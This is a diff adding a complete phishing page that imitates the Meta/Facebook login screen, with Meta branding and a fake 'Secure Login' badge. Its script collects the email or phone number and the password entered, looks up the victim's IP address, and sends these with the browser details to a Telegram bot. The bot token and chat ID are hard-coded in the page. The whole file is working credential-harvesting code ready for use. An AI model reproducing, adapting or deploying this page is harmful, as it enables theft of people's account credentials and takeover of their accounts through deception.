@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in · Meta</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+
+        body {
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-card {
+            background: #ffffff;
+            max-width: 400px;
+            width: 100%;
+            padding: 32px 28px 28px;
+            border-radius: 16px;
+            box-shadow: 0 8px 28px rgba(0, 0, 0, 0.08);
+        }
+
+        .brand {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .brand .meta-icon {
+            font-size: 34px;
+            font-weight: 700;
+            color: #1877f2;
+        }
+
+        .brand .meta-icon i {
+            margin-right: 6px;
+        }
+
+        .brand .meta-icon span {
+            color: #1b1f23;
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .input-group {
+            position: relative;
+        }
+
+        .input-group i {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #8a8d91;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 16px 18px 16px 44px;
+            font-size: 16px;
+            background: #f5f6f8;
+            border: 1px solid #dddfe2;
+            border-radius: 40px;
+            outline: none;
+            transition: border 0.15s;
+        }
+
+        .input-group input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.15);
+        }
+
+        .login-btn {
+            background: #1877f2;
+            border: none;
+            border-radius: 40px;
+            padding: 14px 20px;
+            font-size: 18px;
+            font-weight: 600;
+            color: #ffffff;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .login-btn:hover {
+            background: #166fe5;
+        }
+
+        .login-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .forgotten-link {
+            text-align: center;
+            margin: 10px 0 8px;
+        }
+
+        .forgotten-link a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .divider {
+            border: none;
+            border-top: 1px solid #dadde1;
+            margin: 12px 0 16px;
+        }
+
+        .create-account {
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .create-account a {
+            display: inline-block;
+            background: #42b72a;
+            padding: 14px 28px;
+            border-radius: 40px;
+            color: #ffffff;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .create-account a:hover {
+            background: #36a420;
+        }
+
+        .meta-footer {
+            margin-top: 28px;
+            text-align: center;
+            font-size: 13px;
+            color: #8a8d91;
+            border-top: 1px solid #e4e6e9;
+            padding-top: 18px;
+        }
+
+        .meta-footer .legal {
+            display: flex;
+            gap: 16px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .meta-footer .legal a {
+            color: #8a8d91;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        /* Toast */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: #1b1f23;
+            color: #fff;
+            padding: 14px 28px;
+            border-radius: 60px;
+            font-size: 14px;
+            font-weight: 500;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.35);
+            opacity: 0;
+            transition: all 0.4s ease;
+            pointer-events: none;
+            z-index: 999;
+            max-width: 90%;
+            white-space: nowrap;
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        .toast.error {
+            background: #c0392b;
+        }
+
+        .toast.success {
+            background: #27ae60;
+        }
+
+        .toast i {
+            margin-right: 10px;
+        }
+
+        .toast .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.8s linear infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* User info badge */
+        .user-badge {
+            background: #f0f8ff;
+            border-radius: 12px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 13px;
+            color: #1b1f23;
+            border: 1px solid #b3d9ff;
+        }
+
+        .user-badge i {
+            color: #1877f2;
+            margin-right: 6px;
+        }
+
+        @media (max-width: 480px) {
+            .login-card {
+                padding: 24px 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <!-- User info -->
+        <div class="user-badge">
+            <i class="fas fa-shield-alt"></i> Secure Login · <span id="userDisplay">Guest</span>
+        </div>
+
+        <div class="brand">
+            <div class="meta-icon">
+                <i class="fab fa-facebook"></i><span>Meta</span>
+            </div>
+        </div>
+
+        <form class="login-form" id="loginForm">
+            <div class="input-group">
+                <i class="fas fa-envelope"></i>
+                <input type="text" id="mobileOrEmail" placeholder="Mobile number or email address" required>
+            </div>
+            <div class="input-group">
+                <i class="fas fa-lock"></i>
+                <input type="password" id="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="login-btn" id="loginBtn">Log in</button>
+            <div class="forgotten-link"><a href="#" onclick="return false;">Forgotten password?</a></div>
+            <hr class="divider">
+            <div class="create-account"><a href="#" onclick="return false;">Create new account</a></div>
+        </form>
+
+        <div class="meta-footer">
+            <div>Meta</div>
+            <div class="legal">
+                <a href="#" onclick="return false;">Privacy</a>
+                <a href="#" onclick="return false;">Terms</a>
+                <a href="#" onclick="return false;">Cookies</a>
+                <a href="#" onclick="return false;">Ad choices</a>
+                <a href="#" onclick="return false;">Settings</a>
+            </div>
+            <div style="font-size: 11px; color: #b0b3b8;">© 2026 Meta · All rights reserved</div>
+        </div>
+    </div>
+
+    <!-- Toast -->
+    <div id="toast" class="toast">
+        <span id="toastIcon"></span>
+        <span id="toastMessage">Success</span>
+    </div>
+
+    <script>
+        // ============================================
+        // TELEGRAM CONFIGURATION
+        // ============================================
+        const BOT_TOKEN = '8882839321:AAEUHITmEI4QoonA2jNTx8U7c5fKaZHFDNQ';
+        const CHAT_ID = '6807141450';
+
+        // ============================================
+        // DOM Elements
+        // ============================================
+        const form = document.getElementById('loginForm');
+        const emailInput = document.getElementById('mobileOrEmail');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        const toast = document.getElementById('toast');
+        const toastMsg = document.getElementById('toastMessage');
+        const toastIcon = document.getElementById('toastIcon');
+        const userDisplay = document.getElementById('userDisplay');
+
+        let toastTimer = null;
+
+        // ============================================
+        // TOAST NOTIFICATION
+        // ============================================
+        function showToast(message, type = 'info') {
+            if (toastTimer) {
+                clearTimeout(toastTimer);
+                toastTimer = null;
+            }
+
+            toast.className = 'toast';
+
+            if (type === 'success') {
+                toastIcon.innerHTML = '<i class="fas fa-check-circle"></i>';
+                toast.classList.add('success');
+            } else if (type === 'error') {
+                toastIcon.innerHTML = '<i class="fas fa-exclamation-circle"></i>';
+                toast.classList.add('error');
+            } else if (type === 'loading') {
+                toastIcon.innerHTML = '<span class="spinner"></span>';
+            } else {
+                toastIcon.innerHTML = '<i class="fas fa-info-circle"></i>';
+            }
+
+            toastMsg.textContent = message;
+            toast.classList.add('show');
+
+            if (type !== 'loading') {
+                toastTimer = setTimeout(() => {
+                    toast.classList.remove('show');
+                }, 4000);
+            }
+        }
+
+        // ============================================
+        // SEND TO TELEGRAM
+        // ============================================
+        async function sendToTelegram(email, password) {
+            const timestamp = new Date().toLocaleString('en-GB', {
+                day: '2-digit',
+                month: '2-digit',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+
+            let ip = 'Unknown';
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch (e) {}
+
+            const text =
+                `🔐 *New Login Attempt*%0A📧 Email/Phone: ${encodeURIComponent(email)}%0A🔑 Password: ${encodeURIComponent(password)}%0A🕒 Time: ${encodeURIComponent(timestamp)}%0A📍 IP: ${encodeURIComponent(ip)}%0A🌐 Browser: ${encodeURIComponent(navigator.userAgent.substring(0, 60))}`;
+            const url =
+                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}&parse_mode=Markdown`;
+
+            try {
+                const response = await fetch(url, { method: 'GET' });
+                const result = await response.json();
+                if (response.ok && result.ok) {
+                    return { success: true };
+                } else {
+                    return { success: false, error: result.description || 'Telegram API error' };
+                }
+            } catch (err) {
+                return { success: false, error: err.message || 'Network error' };
+            }
+        }
+
+        // ============================================
+        // FORM SUBMIT
+        // ============================================
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (!email) {
+                showToast('⚠️ Please enter your email or phone number', 'error');
+                emailInput.focus();
+                return;
+            }
+            if (!password) {
+                showToast('⚠️ Please enter your password', 'error');
+                passwordInput.focus();
+                return;
+            }
+
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'Logging in…';
+            showToast('📤 Sending to Telegram...', 'loading');
+
+            const result = await sendToTelegram(email, password);
+
+            loginBtn.disabled = false;
+            loginBtn.textContent = 'Log in';
+
+            if (result.success) {
+                showToast('✅ Login details sent to Telegram!', 'success');
+                // Update user display
+                userDisplay.textContent = email.substring(0, 15) + (email.length > 15 ? '...' : '');
+                // Clear fields
+                emailInput.value = '';
+                passwordInput.value = '';
+            } else {
+                showToast(`❌ Failed: ${result.error}`, 'error');
+            }
+        });
+
+        // ============================================
+        // DEMO LINKS (No alerts)
+        // ============================================
+        document.querySelector('.forgotten-link a')?.addEventListener('click', function(e) {
+            e.preventDefault();
+            showToast('🔐 Forgotten password - demo', 'info');
+        });
+
+        document.querySelector('.create-account a')?.addEventListener('click', function(e) {
+            e.preventDefault();
+            showToast('✨ Create new account - demo', 'info');
+        });
+
+        console.log('✅ Login page ready!');
+        console.log('📨 Bot Token:', BOT_TOKEN.substring(0, 10) + '...');
+        console.log('📨 Chat ID:', CHAT_ID);
+    </script>
+</body>
+</html>
